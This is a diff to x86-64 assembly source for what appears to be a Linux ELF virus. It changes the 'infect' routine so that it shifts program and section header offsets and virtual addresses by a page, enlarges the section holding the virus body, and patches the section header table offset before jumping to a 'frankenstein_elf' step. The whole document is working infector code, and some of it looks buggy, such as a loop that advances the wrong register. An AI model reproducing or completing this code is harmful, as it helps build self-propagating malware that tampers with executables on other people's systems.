@@ -752,10 +752,7 @@ infect:
 	xor r11, r11
 	mov word cx, [r13 + elf_ehdr.e_phnum]
 	check_phdrs:
-		;push rdx
 		.phdr_loop:
-			;cmp rcx, 0
-			;jg .mod_subsequent_phdr		
 			cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
@@ -789,10 +786,13 @@ infect:
 					mov [DATA_OFFSET_HOST], r10
 					add dword r11d, [PAGESIZE]
 					mov dword [r13 + r12 + elf_phdr.p_offset], r11d
-					;add dword [r13 + r12 + elf_phdr.p_offset], PAGESIZE
 					mov dword [data_offset_new_padding],  r11d
-					;sub r11d, dword [data_offset_original]
-					;mov [data_offset_padding_size], r11d
+					mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+					add dword r10d, [PAGESIZE]
+					mov dword [r13 + r12 + elf_phdr.p_vaddr], r10d
+					mov r10, [r13 + r12 + elf_phdr.p_paddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+					add dword r10d, [PAGESIZE]
+					mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing	
 			.mod_subsequent_phdr:
 				;mov rdx, checkptloadfaillen
@@ -804,55 +804,54 @@ infect:
 				mov r11, [r13 + r12 + elf_phdr.p_offset]
 				cmp dword r11d, vxoffset
 				jl .next_phdr
-				add dword r11d, PAGESIZE
+				add dword r11d, [PAGESIZE]
 				mov dword [r13 + r12 + elf_phdr.p_offset], r11d
 		.next_phdr:
 			dec cx 
 			add r12w, word [r13 + elf_ehdr.e_phentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
-			;add [hostentry_offset], word [r13 + elf_hdr.phentsize]
 			cmp cx, 0
 			jg .phdr_loop
-			;jg check_shdrs
-	;add qword [hostentry_offset], r12
 	mov dword [hostentry_offset], r12d
-	jmp frankenstein_elf
-	;jg check_shdrs
+	;jmp frankenstein_elf
 ;****************************************************************************************
 ;	Now update section headers of infected ELF
 ;****************************************************************************************
-
-	xor rdx, rdx
-	mov dx, word [r13 + elf_ehdr.e_shentsize]
+	xor r10, r10
 	xor r11, r11
 	xor rcx, rcx
+	mov word cx, [r13 + elf_ehdr.e_shnum]
 	check_shdrs:
-		push rcx
 		.shdr_loop:
 			cmp dword [r13 + r15 + elf_shdr.sh_offset], vxoffset
 			jge .mod_subsequent_shdr
 			mov r11, [r13 + r15 + elf_shdr.sh_addr]
 			add dword r11d, [r13 + r15 + elf_shdr.sh_size]
-			cmp r10, r11
+			cmp dword r11d, [vxoffset]
 			jne .mod_subsequent_shdr
-			add qword [r13 + r15 + elf_shdr.sh_size], vlen
-
+		;	add word [r13 + r15 + elf_shdr.sh_size], vlen
+			mov dword r10d, [r13 + r15 + elf_shdr.sh_size]
+			add dword r10d, [vlen]
+			mov dword [r13 + r15 + elf_shdr.sh_size], r10d
 
 			.mod_subsequent_shdr:
-				add qword [r13 + r15 + elf_shdr.sh_offset], PAGESIZE
-		;.next_shdr:
-		pop rcx
-		inc rcx 
-		add r15, rdx 
-		cmp rcx, [r13 + elf_ehdr.e_shnum]
-		jl .shdr_loop
-
+				mov r11, [r13 + r15 + elf_shdr.sh_offset]
+				add dword r11d, [PAGESIZE]
+				mov dword [r13 + r15 + elf_shdr.sh_offset], r11d
+				;add dword [r13 + r15 + elf_shdr.sh_offset], PAGESIZE
+		.next_shdr:
+			dec cx 
+			add r12w, word [r13 + elf_ehdr.e_shentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
+			cmp cx, 0
+			jg .shdr_loop
 	mov r11, qword [r13 + elf_ehdr.e_shoff]
 	mov qword [oshoff], r11
-	cmp qword r11, [vxoffset]
-	;jg .patch_ehdr_shoff
-	jl frankenstein_elf
+	cmp dword r11d, [vxoffset]
+	jg .patch_ehdr_shoff
 	jmp fin_infect
-	
+	.patch_ehdr_shoff:
+		add dword r11d, [PAGESIZE]
+		mov dword [r13 + elf_ehdr.e_shoff], r11d
+		jmp frankenstein_elf
 	
 
 ;****************************************************************************************
